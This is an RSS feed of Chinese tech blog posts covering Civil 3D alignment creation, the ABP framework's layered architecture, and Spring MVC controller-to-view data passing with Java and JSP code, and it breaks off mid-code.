<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>二 创建路线 - 沙漠骆驼whlkx</title>
<link>http://www.cnblogs.com/whlkx/p/8850213.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/whlkx/p/8850213.html</guid>
<description>&lt;p&gt;这一节中将给大家介绍一下有关路线创建及编辑的内容。&lt;/p&gt;
&lt;p&gt;路线在civil3d中叫做 Alignment，路线是后续要讲的纵断面图、道路、采样线等对象的基础元素，也就是说先要创建路线对象，然后才能创建纵断面图及其他对象，也就是说纵断面图、采样线、道路等这些对象是依附于路线的。 civil的路线相当于ZDM软件（网上可以搜一下，国产的CAD二次开发软件，还是比较牛逼的）中的剖切多段线，但是civil中的路线要强大多，比如调整路线后，其下的纵断面图、道路、采样线以及填挖方量都会动态变化，关联性相当强大。&lt;/p&gt;
&lt;p&gt;路线的创建一般有两种方法：&lt;/p&gt;
&lt;p&gt;1 利用civil的 路线创建工具进行创建&lt;/p&gt;
&lt;p&gt;2 将已有的多段线对象转换为路线&lt;/p&gt;

&lt;p&gt;1 利用civil的路线创建工具进行创建&lt;/p&gt;
&lt;p&gt;首先点击[创建设计]面板中的[路线]下的[路线创建工具]，然后会弹出一个对话框，需要设置一些基本的属性信息，点击确定之后，就会弹出 [路线布局工具条]，大家需要注意工具条的标题内容，对喽，它就是前面创建的路线的名称，然后点击工具条上的最左侧的那个命令，就可以在模型空间中绘制路线了（如同绘制pline线一样简单）。这时左侧工具空间的树形目录中也会发生相应的变化，会将刚才创建的路线对象显示出来。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/708913/201804/708913-20180415224758197-1435170911.png&quot; alt=&quot;&quot; width=&quot;356&quot; height=&quot;477&quot;/&gt;  &lt;img src=&quot;https://images2018.cnblogs.com/blog/708913/201804/708913-20180415225333788-456145783.png&quot; alt=&quot;&quot; width=&quot;321&quot; height=&quot;492&quot;/&gt;    &lt;img src=&quot;https://images2018.cnblogs.com/blog/708913/201804/708913-20180415230429638-1057241660.png&quot; alt=&quot;&quot; width=&quot;524&quot; height=&quot;345&quot;/&gt;  &lt;img src=&quot;https://images2018.cnblogs.com/blog/708913/201804/708913-20180415230604367-1175532852.png&quot; alt=&quot;&quot; width=&quot;321&quot; height=&quot;271&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 2 将已有的多段线对象转换为路线&lt;/p&gt;
&lt;p&gt; 这个方法稍微方便一些，按下图操作即可。&lt;/p&gt;
&lt;p&gt;  &lt;img src=&quot;https://images2018.cnblogs.com/blog/708913/201804/708913-20180415230912041-1970886362.png&quot; alt=&quot;&quot;/&gt;   &lt;img src=&quot;https://images2018.cnblogs.com/blog/708913/201804/708913-20180415231109356-183766460.png&quot; alt=&quot;&quot; width=&quot;327&quot; height=&quot;479&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 需要注意的一点是，拾取多段线后，命令行会提示当前的路线方向要不要更改。这里有个技巧，就是在拾取多段线时（对下图），如果拾取的位置距离左侧较近，那么路线的起始方向就是左侧，如果拾取的位置距离右侧较近，那么路线的起始方向就是右侧。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/708913/201804/708913-20180415231355196-482096914.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;当不小心把[路线布局工具条]关闭了，这时路线对象已经创建好了，名字也起好了，只是没有在模型空间进行绘制，怎么再把[路线工具条]调出来呢，方法很简单，就是在[工具空间]的树形目录中找到刚才创建的路线对象，然后右键[选择]，这时ribbon中就会显示和路线有关的操作，然后点击下图显示的[几何图形编辑器]命令，这时[路线工具条]又会重新出现，此时就可以接着在模型空间中绘制路线了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/708913/201804/708913-20180415232944252-1362792023.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Sun, 15 Apr 2018 15:32:00 +0000</pubDate>
<dc:creator>沙漠骆驼whlkx</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/whlkx/p/8850213.html</dc:identifier>
</item>
<item>
<title>ABP框架 - N层架构 - lcyhjx</title>
<link>http://www.cnblogs.com/lcyhjx/p/8850172.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lcyhjx/p/8850172.html</guid>
<description>&lt;p&gt;在应用程序设计中，分层架构是一种被广泛使用的技术，它助于降低复杂度和提高代码的可重用性。在ABP框架中，使用了DDD（领域驱动设计）的原则来实现分层架构.&lt;/p&gt;

&lt;p&gt;在DDD(领域驱动设计)架构模型中，有四个基础层。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;表现层&lt;/strong&gt;: 用户访问接口。使用应用层来实现与用户交互。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;应用层&lt;/strong&gt;: 应用层是表现层和领域层之间的媒介，它负责组织和编排业务对象来执行特定的应用任务。，&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;领域层&lt;/strong&gt;：定义业务对象、逻辑和规则，它是整个应用的核心。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;基础设施层&lt;/strong&gt;：为上层提供通用的技术支持，大多数情况会使用第三方库。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在一个现代化的架构应用中，除了DDD模型的4个基础层（表现层、应用层、领域层、基础设施层）以外， 通常还有其他的一些逻辑层和物理层。下面的架构模型图是ABP建议使用并且已经实现的结构模型。ABP框架不仅提供了基类和服务来非常容易的实现此架构模型，并且已经提供了模板程序（参见&lt;a href=&quot;http://www.cnblogs.com/lcyhjx/p/8698507.html&quot;&gt;ABP框架 - 我的第一个WEB API&lt;/a&gt;）来让我们直接在此架构模型上开始开发。&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/60140/201804/60140-20180415222601715-857334693.png&quot; alt=&quot;images&quot;/&gt;&lt;/p&gt;

&lt;p&gt;远程客户端是应用服务的消费者，通过HTTP API的方式来调用应用服务。客户端可以是一个单页应用程序（SPA），一个移动APP，也可以是一个第三方的消费者。本地化和导航可以在客户端中实现。&lt;/p&gt;

&lt;p&gt;ASP.NET (Core) MVC可以被认为是展现层。展现层可以是物理层（通过HTTP API来调用应用服务），也可以是一个逻辑层（直接注入并使用应用服务）。展现层一般提供本地化、导航、对象映射、缓存、配置管理、审计日志等这些功能。也可以处理授权、会话和异常。&lt;/p&gt;

&lt;p&gt;分布式服务层通过API（例如REST、OData、GraphQL）来为远程客户端提供应用服务功能。它不包含任务业务逻辑，仅仅是接收HTTP请求，然后调用相应的应用/领域服务来完成特定功能。分布式服务层一般包括授权、缓存、审计日志、对象映射、异常处理和会话等。&lt;/p&gt;

&lt;p&gt;应用层主要包含应用服务，应用服务从展示层/分布式服务层接收输入DTO对象，然后调用领域层的特定操作，组合编排领域对象，并根据需要返回输出DTO给展示层/分布式服务层。应用层通常也会包括授权、缓存、审计日志、对象映射、会话等。&lt;/p&gt;

&lt;p&gt;领域层主要用来实现业务逻辑，它包括领域实体、值对象、领域服务并执行业务逻辑。它也规约和领域事件。领域层定义了数据仓储接口来读取和持久化实体到数据源，但是领域层并不实现数据仓储。&lt;/p&gt;

&lt;p&gt;领域层定义了数据仓储接口，基础设施层则通过Entity Framework(Core)/NHibernate与实际数据库交互来实现数据仓储接口。基础设施层并没有严格的定义，它里面实现的功能通常是提供给其他层使用的公共功能，比如发送邮件功能，就可以定义在基础设施层。&lt;/p&gt;
</description>
<pubDate>Sun, 15 Apr 2018 15:23:00 +0000</pubDate>
<dc:creator>lcyhjx</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lcyhjx/p/8850172.html</dc:identifier>
</item>
<item>
<title>SpringMVC之数据传递二 - 社会主义接班人</title>
<link>http://www.cnblogs.com/5ishare/p/8849429.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/5ishare/p/8849429.html</guid>
<description>&lt;p&gt;上一篇学习了从url或view中传数据到Controller中，今天学习下数据从Controller传到view中,主要有4种。&lt;/p&gt;
&lt;p&gt;一、ModelAndView&lt;/p&gt;
&lt;p&gt;处理方法返回值类型为 ModelAndView时, 方法体即可通过该对象添加模型数据。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
    @RequestMapping(value = &quot;/testModelAndView&quot;,method =&lt;span&gt; RequestMethod.GET)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ModelAndView testModelAndView(HttpServletRequest request, HttpServletResponse response){
        
        String viewName &lt;/span&gt;= &quot;Hello&quot;;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;视图名&lt;/span&gt;
        ModelAndView modelAndView = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ModelAndView(viewName);
        User user&lt;/span&gt;=&lt;span&gt;new&lt;/span&gt;&lt;span&gt; User();
        user.setName(&lt;/span&gt;&quot;cuiyw&quot;&lt;span&gt;);
        user.setPwd(&lt;/span&gt;&quot;testModelAndView&quot;&lt;span&gt;);
        user.setBirthday(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Date());
        modelAndView.addObject(&lt;/span&gt;&quot;name&quot;,&quot;cyw&quot;&lt;span&gt;);
        modelAndView.addObject(&lt;/span&gt;&quot;user&quot;&lt;span&gt;,user);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; modelAndView;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;二、Model／Map／ModelMap&lt;/p&gt;
&lt;p&gt;入参为org.springframework.ui.Model、org.springframework.ui.ModelMap 或 Java.uti.Map 时，处理方法返回时，Map中的数据会自动添加到模型中&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
    @RequestMapping(value = &quot;/testModel.do&quot;,method =&lt;span&gt; RequestMethod.GET)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String testModel(Model model){
          User user&lt;/span&gt;=&lt;span&gt;new&lt;/span&gt;&lt;span&gt; User();
          user.setName(&lt;/span&gt;&quot;cuiyw&quot;&lt;span&gt;);
          user.setPwd(&lt;/span&gt;&quot;testModel&quot;&lt;span&gt;);
          user.setBirthday(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Date());
          model.addAttribute(&lt;/span&gt;&quot;name&quot;,&quot;cyw&quot;&lt;span&gt;);
          model.addAttribute(&lt;/span&gt;&quot;user&quot;&lt;span&gt;,user);
          &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;Hello&quot;&lt;span&gt;;
    }

    @RequestMapping(value &lt;/span&gt;= &quot;/testMap.do&quot;,method =&lt;span&gt; RequestMethod.GET)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; String testMap(Map&amp;lt;String,Object&amp;gt;&lt;span&gt; map){
          User user&lt;/span&gt;=&lt;span&gt;new&lt;/span&gt;&lt;span&gt; User();
          user.setName(&lt;/span&gt;&quot;cuiyw&quot;&lt;span&gt;);
          user.setPwd(&lt;/span&gt;&quot;testMap&quot;&lt;span&gt;);
          user.setBirthday(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Date());
          map.put(&lt;/span&gt;&quot;name&quot;,&quot;cyw&quot;&lt;span&gt;);
          map.put(&lt;/span&gt;&quot;user&quot;&lt;span&gt;,user);
          &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;Hello&quot;&lt;span&gt;;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面两个我们都可以使用下面的html访问变量。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;%&lt;/span&gt;&lt;span&gt;@ page language&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;java&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; contentType&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/html; charset=utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    pageEncoding&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;http-equiv&lt;/span&gt;&lt;span&gt;=&quot;Content-Type&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;text/html; charset=utf-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Insert title here&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
姓名:${user.name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
密码:${user.pwd}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
出生日期:${user.birthday}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
名字:${name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
名字:${requestScope.name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
姓名:${requestScope.user.name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;三、@SessionAttributes&lt;/p&gt;
&lt;p&gt; 将模型中的某个属性暂存到HttpSession 中，以便多个请求之间可以共享这个属性，比如我们登录之后可能会存登录信息，就可以使用它。@SessionAttributes这个注解只能放到类的上面。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
@SessionAttributes({&quot;user&quot;&lt;span&gt;})
@Controller
@RequestMapping(&lt;/span&gt;&quot;/hello&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; HelloController {
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里我们将上面的user存到HttpSession中，我们可以在jsp中验证一下。&lt;/p&gt;
&lt;p&gt;这里我们在html中加入SessionAttributes:${sessionScope.user.name}。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_2b74cf22-b829-4487-81c4-5378212757bf&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_2b74cf22-b829-4487-81c4-5378212757bf&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_2b74cf22-b829-4487-81c4-5378212757bf&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;%&lt;/span&gt;&lt;span&gt;@ page language&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;java&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; contentType&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/html; charset=utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    pageEncoding&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;http-equiv&lt;/span&gt;&lt;span&gt;=&quot;Content-Type&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;text/html; charset=utf-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Insert title here&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
姓名:${user.name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
密码:${user.pwd}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
出生日期:${user.birthday}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
名字:${name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
名字:${requestScope.name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
姓名:${requestScope.user.name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
SessionAttributes:${sessionScope.user.name}
&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;当我们访问http://localhost:8080/WebMVC/hello/testModelAndView时，jsp输出结果如下.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/733213/201804/733213-20180415205213478-486148766.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面定义了一个testSessionAttributes，它里面什么都没有，只有返回Hello。当我们再访问它时http://localhost:8080/WebMVC/hello/testSessionAttributes.do，会有下图的结果。可以看到jsp中名字部分是没有值得，因为@SessionAttributes({&quot;user&quot;&lt;span data-mce-=&quot;&quot;&gt;})，这只设置了user,对name没设置。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
    @RequestMapping(value = &quot;/testSessionAttributes.do&quot;,method =&lt;span&gt; RequestMethod.GET)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String testSessionAttributes(HttpServletRequest request, HttpServletResponse response){
          &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;Hello&quot;&lt;span&gt;;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/733213/201804/733213-20180415211755020-824712085.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 四、@ModelAttribute&lt;/p&gt;
&lt;p&gt;SpringMVC在每次调用请求处理方法时，都会创建Model类型的一个实例。如果准备使用此实例，则可以在方法中添加一个Model类型的参数,在上面的testModel方法就是这样使用的。它可以用@ModelAttribute来注释方法参数：带有@ModelAttribute注解的方法会将其输入或创建的参数对象添加到Model对象中(若方法中没有显式添加)。也可以用@ModelAttribute标注一个非请求的处理方法（有返回值，无返回值）：被@ModelAttribute注释的方法会在此controller每个方法执行前被执行。&lt;/p&gt;
&lt;p&gt;1.@ModelAttribute注释方法参数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
    @RequestMapping(value = &quot;/testModelAttribute.do&quot;,method =&lt;span&gt; RequestMethod.GET)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; String testModelAttribute(HttpServletRequest request, HttpServletResponse response,@ModelAttribute(&quot;user&quot;)User user,@ModelAttribute(&quot;name&quot;&lt;span&gt;)String name,Model model){
          user.setName(&lt;/span&gt;&quot;cuiyw&quot;&lt;span&gt;);
          user.setPwd(&lt;/span&gt;&quot;testModelAttribute&quot;&lt;span&gt;);
          user.setBirthday(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Date());
          name&lt;/span&gt;=&quot;testModelAttribute&quot;&lt;span&gt;;
          model.addAttribute(&lt;/span&gt;&quot;name&quot;&lt;span&gt;, name);
          &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;Hello&quot;&lt;span&gt;;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里有个奇怪的地方，假如不传name的话，model也可以不用写在参数中，在函数中设置user的值在页面就能获取到，但是如果传入String类型的参数，那它就需要加入model这个参数，并要显示的设置才能在jsp中获取，这个暂时还不知道为什么。&lt;/p&gt;
&lt;p&gt;2.@ModelAttribute标注一个非请求的处理方法&lt;/p&gt;
&lt;p&gt;由于被@ModelAttribute注释的方法会在此controller每个方法执行前被执行。我们可以做个测试。&lt;/p&gt;
&lt;p&gt;1)、有返回值&lt;/p&gt;
&lt;p&gt;这里定义了一个map方法，并被标注为 @ModelAttribute(value = &quot;mymap&quot;)，返回值是Map&amp;lt;String,Object&amp;gt;，在函数里面我们设置了user和name.&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
    @RequestMapping(value = &quot;/testSessionAttributes.do&quot;,method =&lt;span&gt; RequestMethod.GET)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String testSessionAttributes(HttpServletRequest request, HttpServletResponse response){
          &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;Hello&quot;&lt;span&gt;;
    }
    
    @ModelAttribute(value &lt;/span&gt;= &quot;mymap&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Map&amp;lt;String,Object&amp;gt;&lt;span&gt; map() {
      User user&lt;/span&gt;=&lt;span&gt;new&lt;/span&gt;&lt;span&gt; User();
      user.setName(&lt;/span&gt;&quot;cuiyw&quot;&lt;span&gt;);
      user.setPwd(&lt;/span&gt;&quot;ModelAttribute&quot;&lt;span&gt;);
      user.setBirthday(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Date());
      HashMap&lt;/span&gt;&amp;lt;String, Object&amp;gt; map=&lt;span&gt;new&lt;/span&gt; HashMap&amp;lt;String, Object&amp;gt;&lt;span&gt;();
      map.put(&lt;/span&gt;&quot;name&quot;,&quot;cyw&quot;&lt;span&gt;);
      map.put(&lt;/span&gt;&quot;user&quot;&lt;span&gt;,user);
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; map;
    }
    
    
    @RequestMapping(value &lt;/span&gt;= &quot;/testMethodModelAttribute.do&quot;,method =&lt;span&gt; RequestMethod.GET)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String testModelAttribute(HttpServletRequest request, HttpServletResponse response){
          &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;Hello&quot;&lt;span&gt;;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们在页面获取值，这里要注意，其实在 map()方法中是省略了一句，model.addAttribute(&quot;mymap&quot;, map);它对应的是mymap,所以在jsp中不能直接访问user和name。需要通过mymap来访问，我们之前设置的@SessionAttributes({&quot;user&quot;})这里也就不会有值了。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;%&lt;/span&gt;&lt;span&gt;@ page language&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;java&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; contentType&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/html; charset=utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    pageEncoding&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%&amp;gt;&lt;/span&gt;
